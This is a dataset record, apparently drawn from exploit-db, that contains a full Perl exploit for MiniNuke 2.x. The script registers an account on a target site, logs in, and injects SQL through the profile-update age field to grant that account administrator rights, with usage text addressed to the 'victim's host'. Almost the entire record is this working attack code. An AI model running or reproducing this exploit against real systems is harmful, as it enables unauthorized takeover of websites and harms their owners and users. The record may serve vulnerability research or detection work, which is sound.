{
  "id": "1837",
  "title": "MiniNuke 2.x - SQL Injection (Add Admin)",
  "cve": null,
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n#Method found & Exploit scripted by nukedx\r\n#Contacts > ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com\r\n#Original advisory: http://www.nukedx.com/?viewdoc=31\r\n#Usage: mini.pl <host> <path> <user> <pass> <mail>\r\nuse IO::Socket;\r\nif(@ARGV != 5) { usage(); }\r\nelse { exploit(); }\r\nsub header()\r\n{\r\n  print \"\\n- NukedX Security Advisory Nr.2006-31\\r\\n\";\r\n  print \"- MiniNuke v2.x Remote SQL Injection (create an admin) Exploit\\r\\n\";\r\n}\r\nsub usage() \r\n{\r\n  header();\r\n  print \"- Usage: $0 <host> <path> <user> <pass> <mail>\\r\\n\";\r\n  print \"- <host> -> Victim's host ex: www.victim.com\\r\\n\";\r\n  print \"- <path> -> Path to MiniNuke ex: /mininuke/\\r\\n\";\r\n  print \"- <user> -> Desired username to create ex: h4x0r\\r\\n\";\r\n  print \"- <pass> -> Password for our username ex: p4ZZw0rd\\r\\n\";\r\n  print \"- <mail> -> Mail for our username ex: hax0r\\@s3x0r3d.com\\r\\n\";\r\n  exit();\r\n}\r\nsub exploit () \r\n{\r\n  #Our variables...\r\n  $mnserver = $ARGV[0];\r\n  $mnserver =~ s/(http:\\/\\/)//eg;\r\n  $mnhost   = \"http://\".$mnserver;\r\n  $mndir    = $ARGV[1];\r\n  $mnuser   = $ARGV[2];\r\n  $mnpass   = $ARGV[3];\r\n  $mnmail   = $ARGV[4];\r\n  $mnport   = \"80\";\r\n  #Sending data...\r\n  header();\r\n  print \"- Trying to connect: $mnserver\\r\\n\";\r\n  getsession();\r\n}\r\nsub getsession ()\r\n{\r\n  print \"- Getting session for register...\\r\\n\";\r\n  $mnstar   = \"membership.asp?action=new\";\r\n  $mnsreq   = $mnhost.$mndir.$mnstar;\r\n  $mns = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => \"$mnserver\", PeerPort => \"$mnport\") || die \"- Connection failed...\\r\\n\";\r\n  print $mns \"GET $mnsreq HTTP/1.1\\n\";\r\n  print $mns \"Accept: */*\\n\";\r\n  print $mns \"Referer: $mnhost\\n\";\r\n  print $mns \"Accept-Language: tr\\n\";\r\n  print $mns \"User-Agent: NukeZilla\\n\";\r\n  print $mns \"Cache-Control: no-cache\\n\";\r\n  print $mns \"Host: $mnserver\\n\";\r\n  print $mns \"Connection: close\\n\\n\";\r\n  print \"- Connected...\\r\\n\";\r\n  while ($answer = <$mns>) { \r\n    if ($answer =~ /Set-Cookie: (.*?) path=\\//) { $mncookie = $mncookie.$1; }\r\n    if ($answer =~ /G\u00fcvenlik Kodunuz<\\/td><td width=\\\"50%\\\"><b>(.*?)<\\/b><\\/td>/) { $mngvn=$1;doregister(); }\r\n  }\r\n  #if you are here...\r\n  die \"- Exploit failed\\r\\n\";\r\n}\r\nsub doregister ()\r\n{\r\n  close($mns);\r\n  $mntar    = \"membership.asp?action=register\";\r\n  $mnreq    = $mnhost.$mndir.$mntar;\r\n  print \"- Session getting done\\r\\n\";\r\n  print \"- Lets create our user...\\r\\n\";\r\n  $mndata = \"kuladi=\".$mnuser;\r\n  $mndata.= \"&password=\".$mnpass;\r\n  $mndata.= \"&email=\".$mnmail;\r\n  $mndata.= \"&isim=h4x0r\";\r\n  $mndata.= \"&g_soru=whooooo\";\r\n  $mndata.= \"&g_cevap=h4x0rs\";\r\n  $mndata.= \"&icq=1\";\r\n  $mndata.= \"&msn=1\";\r\n  $mndata.= \"&aim=1\";\r\n  $mndata.= \"&sehir=1\";\r\n  $mndata.= \"&meslek=1\";\r\n  $mndata.= \"&cinsiyet=b\";\r\n  $mndata.= \"&yas_1=1\";\r\n  $mndata.= \"&yas_2=1\";\r\n  $mndata.= \"&yas_3=1920\";\r\n  $mndata.= \"&web=http://www.milw0rm.com\";\r\n  $mndata.= \"&imza=h4x0r\";\r\n  $mndata.= \"&mavatar=IMAGES/avatars/1.gif\";\r\n  $mndata.= \"&security_code=\".$mngvn;\r\n  $mndata.= \"&mail_goster=on\";\r\n  $mndatalen = length($mndata);\r\n  $mn =  IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => \"$mnserver\", PeerPort => \"$mnport\") || die \"- Connection failed...\\r\\n\";\r\n  print $mn \"POST $mnreq HTTP/1.1\\r\\n\";\r\n  print $mn \"Accept: */*\\r\\n\";\r\n  print $mn \"Referer: $mnhost\\r\\n\";\r\n  print $mn \"Accept-Language: tr\\r\\n\";\r\n  print $mn \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n  print $mn \"Accept-Encoding: gzip, deflate\\r\\n\";\r\n  print $mn \"User-Agent: NukeZilla\\r\\n\";\r\n  print $mn \"Cookie: $mncookie\\r\\n\";\r\n  print $mn \"Host: $mnserver\\r\\n\";\r\n  print $mn \"Content-length: $mndatalen\\r\\n\";\r\n  print $mn \"Connection: Keep-Alive\\r\\n\";\r\n  print $mn \"Cache-Control: no-cache\\r\\n\\r\\n\";\r\n  print $mn $mndata;\r\n  print $mn \"\\r\\n\\r\\n\";\r\n  while ($answer = <$mn>) { \r\n    if ($answer =~ /Tebrikler !!!/) { \r\n      print \"- Creating user has been done...\\r\\n\"; \r\n      print \"- Loginning in to user...\\r\\n\";\r\n      dologin();\r\n    }\r\n  }\r\n  #if you are here...\r\n  die \"- Exploit failed\\r\\n\";\r\n}\r\nsub dologin ()\r\n{\r\n  close ($mn);\r\n  $mnltar  = \"enter.asp\";\r\n  $mnlreq  = $mnhost.$mndir.$mnltar;\r\n  $mnldata = \"kuladi=\".$mnuser;\r\n  $mnldata.= \"&password=\".$mnpass;\r\n  $mnldata.= \"&guvenlik=423412\";\r\n  $mnldata.= \"&gguvenlik=423412\";\r\n  $mnldatalen = length($mnldata);\r\n  $mnl =  IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => \"$mnserver\", PeerPort => \"$mnport\") || die \"- Connection failed...\\r\\n\";\r\n  print $mnl \"POST $mnlreq HTTP/1.1\\r\\n\";\r\n  print $mnl \"Accept: */*\\r\\n\";\r\n  print $mnl \"Referer: $mnhost\\r\\n\";\r\n  print $mnl \"Accept-Language: tr\\r\\n\";\r\n  print $mnl \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n  print $mnl \"Accept-Encoding: gzip, deflate\\r\\n\";\r\n  print $mnl \"User-Agent: NukeZilla\\r\\n\";\r\n  print $mnl \"Host: $mnserver\\r\\n\";\r\n  print $mnl \"Content-length: $mnldatalen\\r\\n\";\r\n  print $mnl \"Connection: Keep-Alive\\r\\n\";\r\n  print $mnl \"Cache-Control: no-cache\\r\\n\\r\\n\";\r\n  print $mnl $mnldata;\r\n  print $mnl \"\\r\\n\\r\\n\";\r\n  while ($answer = <$mnl>) { \r\n    if ($answer =~ /Set-Cookie: (.*?) path=\\//) { $mnlcookie = $mnlcookie.$1; }\r\n    if ($answer =~ /Cache-control:/) { doadmin(); }\r\n   }\r\n  #if you are here...\r\n  die \"- Exploit failed\\r\\n\";\r\n}\r\nsub doadmin ()\r\n{\r\n  close($mnl);\r\n  print \"- Editing profile..\\r\\n\";\r\n  $mnptar  = \"Your_Account.asp?op=UpdateProfile\";\r\n  $mnpreq  = $mnhost.$mndir.$mnptar;\r\n  $mnpdata.= \"email=\".$mnmail;\r\n  $mnpdata.= \"&isim=h4x0r\";\r\n  $mnpdata.= \"&g_soru=whooooo\";\r\n  $mnpdata.= \"&g_cevap=h4x0rs\";\r\n  $mnpdata.= \"&icq=1\";\r\n  $mnpdata.= \"&msn=1\";\r\n  $mnpdata.= \"&aim=1\";\r\n  $mnpdata.= \"&sehir=1\";\r\n  $mnpdata.= \"&meslek=1\";\r\n  $mnpdata.= \"&cinsiyet=b\";\r\n  $mnpdata.= \"&yas_1=1\";\r\n  $mnpdata.= \"&yas_2=1\";\r\n  $mnpdata.= \"&yas_3=1920',seviye='1\";\r\n  $mnpdata.= \"&web=http://www.milw0rm.com\";\r\n  $mnpdata.= \"&imza=h4x0r\";\r\n  $mnpdata.= \"&mavatar=IMAGES/avatars/1.gif\";\r\n  $mnpdata.= \"&mail_goster=on\";\r\n  $mnpdatalen = length($mnpdata);\r\n  $mnp =  IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => \"$mnserver\", PeerPort => \"$mnport\") || die \"- Connection failed...\\r\\n\";\r\n  print $mnp \"POST $mnpreq HTTP/1.1\\r\\n\";\r\n  print $mnp \"Accept: */*\\r\\n\";\r\n  print $mnp \"Referer: $mnhost\\r\\n\";\r\n  print $mnp \"Accept-Language: tr\\r\\n\";\r\n  print $mnp \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n  print $mnp \"Accept-Encoding: gzip, deflate\\r\\n\";\r\n  print $mnp \"User-Agent: NukeZilla\\r\\n\";\r\n  print $mnp \"Cookie: $mnlcookie\\r\\n\";\r\n  print $mnp \"Host: $mnserver\\r\\n\";\r\n  print $mnp \"Content-length: $mnpdatalen\\r\\n\";\r\n  print $mnp \"Connection: Keep-Alive\\r\\n\";\r\n  print $mnp \"Cache-Control: no-cache\\r\\n\\r\\n\";\r\n  print $mnp $mnpdata;\r\n  print $mn \"\\r\\n\\r\\n\";\r\n  while ($answer = <$mnp>) { \r\n    if ($answer =~ /Tebrikler !!!/) { \r\n      print \"- Editing profile been done...\\r\\n\"; \r\n      print \"- Exploiting finished succesfully\\r\\n\";\r\n      print \"- Your username $mnuser has been created as admin\\r\\n\";\r\n      print \"- You can login with password $mnpass on $mnlreq\\r\\n\";\r\n      exit();\r\n    }\r\n    if ($answer =~ /\u00dcyeler A\u00e7\u00fdkt\u00fdr/) { \r\n      print \"- Exploit failed\\r\\n\";\r\n      exit();\r\n    }\r\n  }\r\n  #if you are here...\r\n  die \"- Exploit failed\\r\\n\";\r\n}\r\n# nukedx.com [2006-05-27]\r\n\r\n# milw0rm.com [2006-05-27]",
  "url": "https://www.exploit-db.com/exploits/1837"
}